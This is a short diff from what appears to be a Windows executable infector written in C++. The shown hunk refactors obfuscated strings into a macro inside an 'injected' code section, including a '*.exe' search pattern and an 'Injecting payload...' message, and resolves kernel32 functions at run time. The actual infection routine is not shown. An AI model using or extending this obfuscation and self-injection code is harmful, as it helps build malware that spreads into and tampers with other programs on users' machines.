@@ -8,31 +8,15 @@ extern ULONGLONG __end_code;
 EXTERN_C_END
 
 __declspec(code_seg("injected")) VOID inj_code_c() {
-    __declspec(allocate("injected")) static CONST auto user32_obf = Obfuscated("USER32.DLL");
-    __declspec(allocate("injected")) static CONST auto mbTitle_obf = Obfuscated("Hello");
-    __declspec(allocate("injected")) static CONST auto mbText_obf = Obfuscated("Hello, world!");
-    __declspec(allocate("injected")) static CONST auto fileName_obf = Obfuscated("hello.exe");
-    __declspec(allocate("injected")) static CONST auto exeExt_obf = Obfuscated("*.exe");
-    __declspec(allocate("injected")) static CONST auto mbInjecting_obf =
-        Obfuscated("Injecting payload...");
-    __declspec(allocate("injected")) static CONST auto errGetModName_obf =
-        Obfuscated("Error getting module name");
-    __declspec(allocate("injected")) static CONST auto errGetDir_obf =
-        Obfuscated("Error getting current directory");
-    __declspec(allocate("injected")) static CONST auto errAlloc_obf =
-        Obfuscated("Error allocating memory");
-    __declspec(allocate("injected")) static CONST auto errFindFile_obf =
-        Obfuscated("Error finding .exe files");
-    CONST Deobfuscator user32_deobf = Deobfuscator(user32_obf);
-    CONST Deobfuscator mbTitle_deobf = Deobfuscator(mbTitle_obf);
-    CONST Deobfuscator mbText_deobf = Deobfuscator(mbText_obf);
-    CONST Deobfuscator fileName_deobf = Deobfuscator(fileName_obf);
-    CONST Deobfuscator mbInjecting_deobf = Deobfuscator(mbInjecting_obf);
-    CONST Deobfuscator exeExt_deobf = Deobfuscator(exeExt_obf);
-    CONST Deobfuscator errGetModName_deobf = Deobfuscator(errGetModName_obf);
-    CONST Deobfuscator errGetDir_deobf = Deobfuscator(errGetDir_obf);
-    CONST Deobfuscator errAlloc_deobf = Deobfuscator(errAlloc_obf);
-    CONST Deobfuscator errFindFile_deobf = Deobfuscator(errFindFile_obf);
+    DECLARE_OBFUSCATED(user32, "USER32.DLL");
+    DECLARE_OBFUSCATED(mbTitle, "Hello");
+    DECLARE_OBFUSCATED(mbText, "Hello, world!");
+    DECLARE_OBFUSCATED(exeExt, "*.exe");
+    DECLARE_OBFUSCATED(mbInjecting, "Injecting payload...");
+    DECLARE_OBFUSCATED(errGetModName, "Error getting module name");
+    DECLARE_OBFUSCATED(errGetDir, "Error getting current directory");
+    DECLARE_OBFUSCATED(errAlloc, "Error allocating memory");
+    DECLARE_OBFUSCATED(errFindFile, "Error finding .exe files");
 
     CONST auto pKernel32Dll = GET_DLL(kernel32.dll);
     CONST auto pLoadLibraryA = GET_FUNC(pKernel32Dll, LoadLibraryA);
